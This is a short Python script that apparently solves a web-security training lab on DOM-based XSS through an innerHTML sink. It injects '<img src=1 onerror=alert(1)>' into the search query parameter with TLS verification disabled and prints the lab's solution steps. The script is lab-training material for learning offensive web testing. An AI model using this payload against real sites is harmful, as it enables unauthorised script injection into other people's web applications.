import requests
import urllib3
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "DOM XSS in innerHTML sink using source location.search"

def run(url, payload, proxies=None):
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Inject payload in the search query parameter\n2. Observe that the alert function has been called\n""")
    
    path = "?search="
    payload = '<img src=1 onerror=alert(1)>'
    try:
        r = requests.get(url.rstrip('/') + path + payload, verify=False, proxies=proxies)
        res = r.text
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False